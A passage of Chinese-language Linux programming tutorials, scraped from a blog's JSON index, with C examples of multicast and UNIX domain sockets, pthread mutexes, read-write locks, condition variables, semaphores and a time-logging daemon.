*/inet_pton(AF_INET, &quot;0.0.0.0&quot;, &amp;group.imr_address); /* 使用本地任意IP添加到组播组 */group.imr_ifindex = if_nametoindex(&quot;eth0&quot;); /* 通过网卡名--&gt;编号 ip ad */ setsockopt(confd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &amp;group, sizeof(group));/* 设置client 加入多播组 */ 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;net/if.h&gt;#define SERVER_PORT 8000#define CLIENT_PORT 9000#define GROUP \"239.0.0.2\"int main(int argc, char *argv[])&#123; struct sockaddr_in localaddr; int confd; ssize_t len; char buf[BUFSIZ]; struct ip_mreqn group; /* 组播结构体 */ confd = socket(AF_INET, SOCK_DGRAM, 0); bzero(&amp;localaddr, sizeof(localaddr)); /* 初始化 */ localaddr.sin_family = AF_INET; inet_pton(AF_INET, \"0.0.0.0\" , &amp;localaddr.sin_addr.s_addr); localaddr.sin_port = htons(CLIENT_PORT); bind(confd, (struct sockaddr *)&amp;localaddr, sizeof(localaddr)); inet_pton(AF_INET, GROUP, &amp;group.imr_multiaddr); /* 设置组地址 */ inet_pton(AF_INET, \"0.0.0.0\", &amp;group.imr_address); /* 使用本地任意IP添加到组播组 */ group.imr_ifindex = if_nametoindex(\"eth0\"); /* 通过网卡名--&gt;编号 ip ad */ setsockopt(confd, IPPROTO_IP, IP_ADD_MEMBERSHIP, &amp;group, sizeof(group));/* 设置client 加入多播组 */ while (1) &#123; len = recvfrom(confd, buf, sizeof(buf), 0, NULL, 0); write(STDOUT_FILENO, buf, len); &#125; close(confd); return 0;&#125; socket IPC（本地套接字domain） 使用UNIX Domain Socket的过程和网络socket十分相似，也要先调用socket()创建一个socket文件描述符，address family指定为AF_UNIX，type可以选择SOCK_DGRAM或SOCK_STREAM，protocol参数仍然指定为0即可。 UNIX Domain Socket与网络socket编程最明显的不同在于地址格式不同，用结构体sockaddr_un表示，网络编程的socket地址是IP地址加端口号，而UNIX Domain Socket的地址是一个socket类型的文件在文件系统中的路径，这个socket文件由bind()调用创建，如果调用bind()时该文件已存在，则bind()错误返回。 对比网络套接字地址结构和本地套接字地址结构： 12345678910struct sockaddr_in &#123;__kernel_sa_family_t sin_family; /* Address family */ 地址结构类型__be16 sin_port; /* Port number */ 端口号struct in_addr sin_addr; /* Internet address */ IP地址&#125;;struct sockaddr_un &#123;__kernel_sa_family_t sun_family; /* AF_UNIX */ 地址结构类型char sun_path[UNIX_PATH_MAX]; /* pathname */ socket文件名(含路径)&#125;; 以下程序将UNIX Domain socket绑定到一个地址。 12size = offsetof(struct sockaddr_un, sun_path) + strlen(un.sun_path);#define offsetof(type, member) ((int)&amp;((type *)0)-&gt;MEMBER) offsetof unlink 删除pathname指定的硬链接,并由pathname所引用的文件链接计数减1 123#include &lt;unistd.h&gt;int unlink(const char *pathname); server 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;strings.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/un.h&gt;#include &lt;stddef.h&gt;#include \"wrap.h\"#define SERV_ADDR \"serv.socket\"int main(void)&#123; int lfd, cfd, len, size, i; struct sockaddr_un servaddr, cliaddr; char buf[4096]; lfd = Socket(AF_UNIX, SOCK_STREAM, 0); bzero(&amp;servaddr, sizeof(servaddr)); servaddr.sun_family = AF_UNIX; strcpy(servaddr.sun_path,SERV_ADDR); len = offsetof(struct sockaddr_un, sun_path) + strlen(servaddr.sun_path); /* servaddr total len */ unlink(SERV_ADDR); /* 确保bind之前serv.sock文件不存在,bind会创建该文件 */ Bind(lfd, (struct sockaddr *)&amp;servaddr, len); /* 参3不能是sizeof(servaddr) */ Listen(lfd, 20); printf(\"Accept ...\\n\"); while (1) &#123; len = sizeof(cliaddr); cfd = Accept(lfd, (struct sockaddr *)&amp;cliaddr, (socklen_t *)&amp;len); len -= offsetof(struct sockaddr_un, sun_path); /* 得到文件名的长度 */ cliaddr.sun_path[len] = '\\0'; /* 确保打印时,没有乱码出现 */ printf(\"client bind filename %s\\n\", cliaddr.sun_path); while ((size = read(cfd, buf, sizeof(buf))) &gt; 0) &#123; for (i = 0; i &lt; size; i++) buf[i] = toupper(buf[i]); write(cfd, buf, size); &#125; close(cfd); &#125; close(lfd); return 0;&#125; Client 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt; #include &lt;sys/socket.h&gt;#include &lt;strings.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/un.h&gt;#include &lt;stddef.h&gt;#include \"wrap.h\"#define SERV_ADDR \"serv.socket\"#define CLIE_ADDR \"clie.socket\"int main(void)&#123; int cfd, len; struct sockaddr_un servaddr, cliaddr; char buf[4096]; cfd = Socket(AF_UNIX, SOCK_STREAM, 0); bzero(&amp;cliaddr, sizeof(cliaddr)); cliaddr.sun_family = AF_UNIX; strcpy(cliaddr.sun_path,CLIE_ADDR); len = offsetof(struct sockaddr_un, sun_path) + strlen(cliaddr.sun_path); /* 计算客户端地址结构有效长度 */ unlink(CLIE_ADDR); Bind(cfd, (struct sockaddr *)&amp;cliaddr, len); /* 客户端也需要bind, 不能依赖自动绑定*/ bzero(&amp;servaddr, sizeof(servaddr)); /* 构造server 地址 */ servaddr.sun_family = AF_UNIX; strcpy(servaddr.sun_path,SERV_ADDR); len = offsetof(struct sockaddr_un, sun_path) + strlen(servaddr.sun_path); /* 计算服务器端地址结构有效长度 */ Connect(cfd, (struct sockaddr *)&amp;servaddr, len); while (fgets(buf, sizeof(buf), stdin) != NULL) &#123; write(cfd, buf, strlen(buf)); len = read(cfd, buf, sizeof(buf)); write(STDOUT_FILENO, buf, len); &#125; close(cfd); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"线程同步","slug":"linux083线程同步","date":"2022-01-29T17:35:19.000Z","updated":"2022-02-20T13:09:49.535Z","comments":true,"path":"2022/01/30/linux083线程同步/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/30/linux083线程同步/","excerpt":"","text":"1 互斥锁 1.1互斥锁的使用步骤 第1步：创建一把互斥锁 pthread_mutex_t mutex; 初始化互斥锁 pthread_mutex_init(&amp;mutex);—相当于mutex=1 在代码中寻找共享资源（也称为临界区） pthread_mutex_lock(&amp;mutex); -- mutex = 0 临界区代码 pthread_mutex_unlock(&amp;mutex); -- mutex = 1 释放互斥锁资源 pthread_mutex_destroy(&amp;mutex); 注意：必须在所有操作共享资源的线程上都加上锁否则不能起到同步的效果 1.2 练习 编写思路： 1 定义一把互斥锁，应该为一全局变量 pthread_mutex_t mutex; 2 在main函数中对mutex进行初始化 pthread_mutex_init(&amp;mutex, NULL); 3 创建两个线程，在两个线程中加锁和解锁 4 主线程释放互斥锁资源 pthread_mutex_destroy(&amp;mutex); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;time.h&gt;//定义一把锁pthread_mutex_t mutex;void *mythread1(void *args)&#123; while(1) &#123; //加锁 pthread_mutex_lock(&amp;mutex); printf(\"hello \"); sleep(rand()%3); printf(\"world\\n\"); //解锁 pthread_mutex_unlock(&amp;mutex); sleep(rand()%3); &#125; pthread_exit(NULL);&#125;void *mythread2(void *args)&#123; while(1) &#123; //加锁 pthread_mutex_lock(&amp;mutex); printf(\"HELLO \"); sleep(rand()%3); printf(\"WORLD\\n\"); //解锁 pthread_mutex_unlock(&amp;mutex); sleep(rand()%3); &#125; pthread_exit(NULL);&#125;int main()&#123; int ret; pthread_t thread1; pthread_t thread2; //随机数种子 srand(time(NULL)); //互斥锁初始化 pthread_mutex_init(&amp;mutex, NULL); ret = pthread_create(&amp;thread1, NULL, mythread1, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; ret = pthread_create(&amp;thread2, NULL, mythread2, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; //等待线程结束 pthread_join(thread1, NULL); pthread_join(thread2, NULL); //释放互斥锁 pthread_mutex_destroy(&amp;mutex); return 0;&#125; 1.3 死锁 死锁并不是linux提供给用户的一种使用方法，而是由于用户使用互斥锁不当引起的一种现象。 常见的死锁有两种： 第一种：自己锁自己，如下图代码片段 第二种 线程A拥有A锁，请求获得B锁；线程B拥有B锁，请求获得A锁，这样造成线程A和线程B都不释放自己的锁，而且还想得到对方的锁，从而产生死锁，如下图所示： 如何解决死锁： 让线程按照一定的顺序去访问共享资源 在访问其他锁的时候，需要先将自己的锁解开 调用pthread_mutex_trylock，如果加锁不成功会立刻返回 ​ 自己锁自己. ​ 注意点: 线程在异常退出的时候也需要解锁. A线程占用着A锁, 又想去获得B锁; B线程占用着B锁, 又想去获得A锁, ​ 两个线程都不释放自己的锁, 又想去获得对方的锁, 从而造成了死锁. ​ 解决方法: ​ 1 需要先释放自己的锁再去获得其他锁 ​ 2 避免使用嵌套的锁, 让线程按照一定的顺序加锁 ​ 3 可以调用pthread_mutex_trylock函数加锁, 该函数不阻塞, 所以不会产生死锁. 2 读写锁 什么是读写锁 读写锁也叫共享-独占锁。当读写锁以读模式锁住时，它是以共享模式锁住的；当它以写模式锁住时，它是以独占模式锁住的。写独占、读共享。 读写锁使用场合 读写锁非常适合于对数据结构读的次数远大于写的情况。 读写锁特性 读写锁是“写模式加锁”时，解锁前，所有对该锁加锁的线程都会被阻塞。 读写锁是“读模式加锁”时，如果线程以读模式对其加锁会成功；如果线程以写模式加锁会阻塞。 读写锁是“读模式加锁”时， 既有试图以写模式加锁的线程，也有试图以读模式加锁的线程。那么读写锁会阻塞随后的读模式锁请求。优先满足写模式锁。读锁、写锁并行阻塞，写锁优先级高 读写锁场景练习: 线程A加写锁成功, 线程B请求读锁 线程B阻塞 线程A持有读锁, 线程B请求写锁 线程B阻塞 线程A拥有读锁, 线程B请求读锁 线程B加锁成功 线程A持有读锁, 然后线程B请求写锁, 然后线程C请求读锁 B阻塞，c阻塞 - 写的优先级高 A解锁，B线程加写锁成功，C继续阻塞 B解锁，C加读锁成功 线程A持有写锁, 然后线程B请求读锁, 然后线程C请求写锁 BC阻塞 A解锁，C加写锁成功，B继续阻塞 C解锁，B加读锁成功 读写锁总结 读并行，写独占，当读写同时等待锁的时候写的优先级高 读写锁主要操作函数 定义一把读写锁 pthread_rwlock_t rwlock; 初始化读写锁 int pthread_rwlock_init(pthread_rwlock_t *restrict rwlock, const pthread_rwlockattr_t *restrict attr); 函数参数 rwlock-读写锁 attr-读写锁属性，传NULL为默认属性 销毁读写锁 int pthread_rwlock_destroy(pthread_rwlock_t *rwlock); 加读锁 int pthread_rwlock_rdlock(pthread_rwlock_t *rwlock); 尝试加读锁 int pthread_rwlock_tryrdlock(pthread_rwlock_t *rwlock); 加写锁 int pthread_rwlock_wrlock(pthread_rwlock_t *rwlock); 尝试加写锁 int pthread_rwlock_trywrlock(pthread_rwlock_t *rwlock); 解锁 int pthread_rwlock_unlock(&amp;pthread_rwlock_t *rwlock); 练习：3个线程不定时写同一全局资源，5个线程不定时读同一全局资源。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192//读写锁测试程序#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;int number = 0;//定义一把读写锁pthread_rwlock_t rwlock;//写线程回调函数void *thread_write(void *arg)&#123; int i = *(int *)arg; int cur; while(1) &#123; //加写锁 pthread_rwlock_wrlock(&amp;rwlock); cur = number; cur++; number = cur; printf(\"[%d]-W:[%d]\\n\", i, cur); //解锁 pthread_rwlock_unlock(&amp;rwlock); sleep(rand()%3); &#125;&#125;//读线程回调函数void *thread_read(void *arg)&#123; int i = *(int *)arg; int cur; while(1) &#123; //加读锁 pthread_rwlock_rdlock(&amp;rwlock); cur = number; printf(\"[%d]-R:[%d]\\n\", i, cur); //解锁 pthread_rwlock_unlock(&amp;rwlock); sleep(rand()%3); &#125; &#125;int main()&#123; int n = 8; int i = 0; int arr[8]; pthread_t thread[8]; //读写锁初始化 pthread_rwlock_init(&amp;rwlock, NULL); //创建3个写子线程 for(i=0; i&lt;3; i++) &#123; arr[i] = i; pthread_create(&amp;thread[i], NULL, thread_write, &amp;arr[i]); &#125; //创建5个读子线程 for(i=3; i&lt;n; i++) &#123; arr[i] = i; pthread_create(&amp;thread[i], NULL, thread_read, &amp;arr[i]); &#125; //回收子线程 int j = 0; for(j=0;j&lt;n; j++) &#123; pthread_join(thread[j], NULL); &#125; //释放锁 pthread_rwlock_destroy(&amp;rwlock); return 0;&#125; 3 条件变量 条件本身不是锁！但它也可以造成线程阻塞。通常与互斥锁配合使用。给多线程提供一个会合的场所。 使用互斥量保护共享数据; 使用条件变量可以使线程阻塞, 等待某个条件的发生, 当条件满足的时候解除阻塞. 条件变量的两个动作: 条件不满足, 阻塞线程 条件满足, 通知阻塞的线程解除阻塞, 开始工作. 条件变量相关函数 pthread_cond_t cond; 定义一个条件变量 int pthread_cond_init(pthread_cond_t *restrict cond,const pthread_condattr_t *restrict attr); 函数描述:初始化条件变量 函数参数: cond: 条件变量 attr: 条件变量属性, 通常传NULL 函数返回值:成功返回0, 失败返回错误号 int pthread_cond_destroy(pthread_cond_t *cond); 函数描述: 销毁条件变量 函数参数: 条件变量 返回值: 成功返回0, 失败返回错误号 int pthread_cond_wait(pthread_cond_t *restrict cond, pthread_mutex_t *restrict mutex); 函数描述: 条件不满足, 引起线程阻塞并解锁; ​ 条件满足, 解除线程阻塞, 并加锁 函数参数: cond: 条件变量 mutex: 互斥锁变量 函数返回值: 成功返回0, 失败返回错误号 int pthread_cond_signal(pthread_cond_t *cond); 函数描述: 唤醒至少一个阻塞在该条件变量上的线程 函数参数: 条件变量 函数返回值: 成功返回0, 失败返回错误号 pthread_cond_broadcas(pthread_cond_t *cond) 唤醒睡眠的线程，一次唤醒所有睡眠的线程 函数参数: 条件变量 4 使用条件变量的代码片段 上述代码中，生产者线程调用pthread_cond_signal函数会使消费者线程在pthread_cond_wait处解除阻塞。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125//使用条件变量实现生产者和消费者模型#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;typedef struct node&#123; int data; struct node *next;&#125;NODE;NODE *head = NULL;//定义一把锁pthread_mutex_t mutex;//定义条件变量pthread_cond_t cond;//生产者线程void *producer(void *arg)&#123; NODE *pNode = NULL; while(1) &#123; //生产一个节点 pNode = (NODE *)malloc(sizeof(NODE)); if(pNode==NULL) &#123; perror(\"malloc error\"); exit(-1); &#125; pNode-&gt;data = rand()%1000; printf(\"P:[%d]\\n\", pNode-&gt;data); //加锁 pthread_mutex_lock(&amp;mutex); pNode-&gt;next = head; head = pNode; //解锁 pthread_mutex_unlock(&amp;mutex); //通知消费者线程解除阻塞 pthread_cond_signal(&amp;cond); sleep(rand()%3); &#125;&#125;//消费者线程void *consumer(void *arg)&#123; NODE *pNode = NULL; while(1) &#123; //加锁 pthread_mutex_lock(&amp;mutex); if(head==NULL) &#123; //若条件不满足,需要阻塞等待 //若条件不满足,则阻塞等待并解锁; //若条件满足(被生成者线程调用pthread_cond_signal函数通知),解除阻塞并加锁 pthread_cond_wait(&amp;cond, &amp;mutex); &#125; printf(\"C:[%d]\\n\", head-&gt;data); pNode = head; head = head-&gt;next; //解锁 pthread_mutex_unlock(&amp;mutex); free(pNode); pNode = NULL; sleep(rand()%3); &#125;&#125;int main()&#123; int ret; pthread_t thread1; pthread_t thread2; //初始化互斥锁 pthread_mutex_init(&amp;mutex, NULL); //条件变量初始化 pthread_cond_init(&amp;cond, NULL); //创建生产者线程 ret = pthread_create(&amp;thread1, NULL, producer, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; //创建消费者线程 ret = pthread_create(&amp;thread2, NULL, consumer, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; //等待线程结束 pthread_join(thread1, NULL); pthread_join(thread2, NULL); //释放互斥锁 pthread_mutex_destroy(&amp;mutex); //释放条件变量 pthread_cond_destroy(&amp;cond); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143//使用条件变量实现生产者和消费者模型#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;typedef struct node&#123; int data; struct node *next;&#125;NODE;NODE *head = NULL;//定义一把锁pthread_mutex_t mutex;//定义条件变量pthread_cond_t cond;//生产者线程void *producer(void *arg)&#123; NODE *pNode = NULL; int n = *(int *)arg; while(1) &#123; //生产一个节点 pNode = (NODE *)malloc(sizeof(NODE)); if(pNode==NULL) &#123; perror(\"malloc error\"); exit(-1); &#125; pNode-&gt;data = rand()%1000; printf(\"P[%d]:[%d]\\n\", n, pNode-&gt;data); //加锁 pthread_mutex_lock(&amp;mutex); pNode-&gt;next = head; head = pNode; //解锁 pthread_mutex_unlock(&amp;mutex); //通知消费者线程解除阻塞 pthread_cond_signal(&amp;cond); sleep(rand()%3); &#125;&#125;//消费者线程void *consumer(void *arg)&#123; NODE *pNode = NULL; int n = *(int *)arg; while(1) &#123; //加锁 pthread_mutex_lock(&amp;mutex); if(head==NULL) &#123; //若条件不满足,需要阻塞等待 //若条件不满足,则阻塞等待并解锁; //若条件满足(被生成者线程调用pthread_cond_signal函数通知),解除阻塞并加锁 pthread_cond_wait(&amp;cond, &amp;mutex); &#125; if(head==NULL) &#123; //解锁 pthread_mutex_unlock(&amp;mutex); continue; &#125; printf(\"C[%d]:[%d]\\n\", n, head-&gt;data); pNode = head; head = head-&gt;next; //解锁 pthread_mutex_unlock(&amp;mutex); free(pNode); pNode = NULL; sleep(rand()%3); &#125;&#125;int main()&#123; int ret; int i = 0; pthread_t thread1[5]; pthread_t thread2[5]; //初始化互斥锁 pthread_mutex_init(&amp;mutex, NULL); //条件变量初始化 pthread_cond_init(&amp;cond, NULL); int arr[5]; for(i=0; i&lt;5; i++) &#123; arr[i]= i; //创建生产者线程 ret = pthread_create(&amp;thread1[i], NULL, producer, &amp;arr[i]); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; //创建消费者线程 ret = pthread_create(&amp;thread2[i], NULL, consumer, &amp;arr[i]); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; &#125; //等待线程结束 for(i=0; i&lt;5; i++) &#123; pthread_join(thread1[i], NULL); pthread_join(thread2[i], NULL); &#125; //释放互斥锁 pthread_mutex_destroy(&amp;mutex); //释放条件变量 pthread_cond_destroy(&amp;cond); return 0;&#125; 信号量 1 信号量介绍 ​ 信号量相当于多把锁, 可以理解为是加强版的互斥锁 2 相关函数 定义信号量 sem_t sem; int sem_init(sem_t *sem, int pshared, unsigned int value); 函数描述: 初始化信号量 函数参数: sem: 信号量变量 pshared: 0表示线程同步, 1表示进程同步 value: 最多有几个线程操作共享数据 函数返回值:成功返回0, 失败返回-1, 并设置errno值 int sem_wait(sem_t *sem); 函数描述: 调用该函数一次, 相当于sem--, 当sem为0的时候, 引起阻塞 函数参数: 信号量变量 函数返回值: 成功返回0, 失败返回-1, 并设置errno值 int sem_post(sem_t *sem); 函数描述: 调用一次, 相当于sem++ ` 函数参数: 信号量变量 函数返回值: 成功返回0, 失败返回-1, 并设置errno值 int sem_trywait(sem_t *sem); 函数描述: 尝试加锁, 若失败直接返回, 不阻塞 函数参数: 信号量变量 函数返回值: 成功返回0, 失败返回-1, 并设置errno值 int sem_destroy(sem_t *sem); 函数描述: 销毁信号量 函数参数: 信号量变量 函数返回值: 成功返回0, 失败返回-1, 并设置errno值 3 信号量代码片段: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109//使用信号量实现生产者和消费者模型#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;semaphore.h&gt;typedef struct node&#123; int data; struct node *next;&#125;NODE;NODE *head = NULL;//定义信号量sem_t sem_producer;sem_t sem_consumer;//生产者线程void *producer(void *arg)&#123; NODE *pNode = NULL; while(1) &#123; //生产一个节点 pNode = (NODE *)malloc(sizeof(NODE)); if(pNode==NULL) &#123; perror(\"malloc error\"); exit(-1); &#125; pNode-&gt;data = rand()%1000; printf(\"P:[%d]\\n\", pNode-&gt;data); //加锁 sem_wait(&amp;sem_producer); //-- pNode-&gt;next = head; head = pNode; //解锁 sem_post(&amp;sem_consumer); //相当于++ sleep(rand()%3); &#125;&#125;//消费者线程void *consumer(void *arg)&#123; NODE *pNode = NULL; while(1) &#123; //加锁 sem_wait(&amp;sem_consumer); //相当于-- printf(\"C:[%d]\\n\", head-&gt;data); pNode = head; head = head-&gt;next; //解锁 sem_post(&amp;sem_producer); //相当于++ free(pNode); pNode = NULL; sleep(rand()%3); &#125;&#125;int main()&#123; int ret; pthread_t thread1; pthread_t thread2; //初始化信号量 sem_init(&amp;sem_producer, 0, 5); sem_init(&amp;sem_consumer, 0, 0); //创建生产者线程 ret = pthread_create(&amp;thread1, NULL, producer, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; //创建消费者线程 ret = pthread_create(&amp;thread2, NULL, consumer, NULL); if(ret!=0) &#123; printf(\"pthread_create error, [%s]\\n\", strerror(ret)); return -1; &#125; //等待线程结束 pthread_join(thread1, NULL); pthread_join(thread2, NULL); //释放信号量资源 sem_destroy(&amp;sem_producer); sem_destroy(&amp;sem_consumer); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"守护进程和线程","slug":"linux082守护进程和线程","date":"2022-01-24T12:30:39.000Z","updated":"2022-01-29T19:12:09.139Z","comments":true,"path":"2022/01/24/linux082守护进程和线程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/24/linux082守护进程和线程/","excerpt":"","text":"守护进程 1.1 守护进程介绍 Daemon(精灵)进程，是Linux中的后台服务进程，通常独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。一般采用以d结尾的名字，如vsftpd Linux后台的一些系统服务进程，没有控制终端，不能直接和用户交互。不受用户登录、注销的影响，一直在运行着，他们都是守护进程。如：预读入缓输出机制的实现；ftp服务器；nfs服务器等。 总结守护进程的特点： Linux后台服务进程 独立于控制终端 周期性的执行某种任务 不受用户登陆和注销的影响 一般采用以d结尾的名字 1.2 进程组和会话 进程组 进程组是一个或者多个进程的集合，每个进程都属于一个进程组，引入进程组是为了简化对进程的管理。当父进程创建子进程的时候，默认子进程与父进程属于同一个进程组。 进程组ID==第一个进程ID（组长进程）。如父进程创建了多个子进程，父进程和多个子进程同属于一个组，而由于父进程是进程组里的第一个进程，所以父进程就是这个组的组长, 组长ID==父进程ID。 可以使用kill -SIGKILL -进程组ID(负的)来将整个进程组内的进程全部杀死。 只要进程组中有一个进程存在，进程组就存在，与组长进程是否终止无关。 进程组生存期：从进程组创建到最后一个进程离开 会话 一个会话是一个或多个进程组的集合。 创建会话的进程不能是进程组组长 创建会话的进程成为一个进程组的组长进程，同时也成为会话的会长。 需要有root权限（ubuntu不需要） 新创建的会话丢弃原有的控制终端 建立新会话时，先调用fork, 父进程终止，子进程调用setsid函数 可以使用ps ajx来查看进程组ID和会话ID 可以fork出几个子进程，然后查看进程组ID和会话ID 进程组和会话的关系图 1.3 创建守护进程的模型 123#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;pid_t setsid(void); 12成功后，将返回调用进程的（新）会话ID。一旦出错，返回（pid_t）-1，并设置errno以指示错误。 第1步：fork子进程，父进程退出 子进程继承了父进程的进程组ID, 但具有一个新的进程ID,这样就保证了子进程不是一个进程组的组长ID,这对于下面要做的setsid函数的调用是必要的前提条件 第2步：子进程调用setsid函数创建新会话 调用这个函数以后 该进程成为新会话的首进程，是会话的会长 成为一个新进程组的组长进程，是进程组组长 不受控制终端的影响 第3步：改变当前工作目录chdir 如：a.out在U盘上，启动这个程序，这个程序的当前的工作目录就是这个u盘，如果u盘拔掉后进程的当前工作目录将消失，a.out将不能正常工作。 第4步：重设文件掩码 mode &amp; ~umask 子进程会继承父进程的掩码 增加子进程程序操作的灵活性 umask(0000);最右边的0代表八进制 第5步：关闭文件描述符 守护进程不受控制终端的影响所以可以关闭，以释放资源 close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO); 第6步：执行核心工作 守护进程的核心代码逻辑 1.4练习 ​ 编写一个守护进程，每隔2S钟获取一次系统时间，并将这个时间写入磁盘文件。 分析：首先要按照1.3介绍的守护进行的步骤创建一个守护进程 题目要求每隔2S钟，所以需要一个定时器，2S钟触发一次，需要调用setitimer函数创建一个定时器，并且要捕获SIGALRM信号，然后在SIGALRM信号处理函数里面完成获取系统时间，然后将时间写入文件。 用到的主要知识点： 创建守护进程的模型 setitimer函数的使用 sigaction函数 文件I/O操作 获取系统时间函数time，将time_t类型转换为字符串ctime函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081//创建守护进程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;time.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/time.h&gt;void myfunc(int signo)&#123; //打开文件 int fd = open(\"mydemon.log\", O_RDWR | O_CREAT | O_APPEND, 0755); if(fd&lt;0) &#123; return; &#125; //获取当前的系统时间 time_t t; time(&amp;t); //将时间转换为字符串形式 char *p = ctime(&amp;t); //将时间写入文件 write(fd, p, strlen(p)); close(fd); return;&#125;int main()&#123; //父进程fork子进程, 然后父进程退出 pid_t pid = fork(); if(pid&lt;0 || pid&gt;0) &#123; exit(1); &#125; //子进程调用setsid函数创建会话 setsid(); //改变当前的工作目录 chdir(\"/home/itcast/log\"); //改变文件掩码 umask(0000); //关闭标准输入,输出和错误输出文件描述符 close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO); //核心操作 //注册信号处理函数 struct sigaction act; act.sa_handler = myfunc; act.sa_flags = 0; sigemptyset(&amp;act.sa_mask); sigaction(SIGALRM, &amp;act, NULL); //设置时钟 struct itimerval tm; tm.it_interval.tv_sec = 2; tm.it_interval.tv_usec = 0; tm.it_value.tv_sec = 3; tm.it_value.tv_usec = 0; setitimer(ITIMER_REAL, &amp;tm, NULL); printf(\"hello world\\n\"); while(1) &#123; sleep(1); &#125;&#125; 优化: 1 不再频繁的打开和关闭文件 2 如何控制log文件大小 test.log 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495//编写守护进程: 每隔2秒获取一次系统时间,并将时间写入文件#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/time.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;time.h&gt;int fd;int flag = 0;//信号处理函数void sighandler(int signo)&#123; //获取当前系统时间 time_t tm; time(&amp;tm); char *p = ctime(&amp;tm); if(flag==0) &#123; //新建文件 fd = open(\"./mydaemon.log\", O_RDWR | O_CREAT | O_APPEND, 0777); if(fd&lt;0) &#123; perror(\"open error\"); return; &#125; flag = 1; &#125; //写文件 write(fd, p, strlen(p)); return;&#125;int main()&#123; //fork子进程，父进程退出 pid_t pid = fork(); if(pid&lt;0 || pid&gt;0) &#123; exit(0); &#125; //子进程调用setsid函数创建新会话 setsid(); //改变当前工作目录chdir chdir(\"/home/itcast\"); //重设文件掩码 umask(0000); //关闭标准输入,标准输出, 标准错误输出这三个文件描述符 close(STDIN_FILENO); close(STDOUT_FILENO); close(STDERR_FILENO); //核心工作 struct sigaction act; act.sa_handler = sighandler; act.sa_flags = 0; sigemptyset(&amp;act.sa_mask); sigaction(SIGALRM, &amp;act, NULL); //调用setitimer函数设置时钟 struct itimerval tm; tm.it_interval.tv_sec = 2; tm.it_interval.tv_usec = 0; tm.it_value.tv_sec = 3; tm.it_value.tv_usec = 0; setitimer(ITIMER_REAL, &amp;tm, NULL); while(1) &#123; //获取文件大小 int size = lseek(fd, 0, SEEK_END); if(size&gt;100) &#123; close(fd); 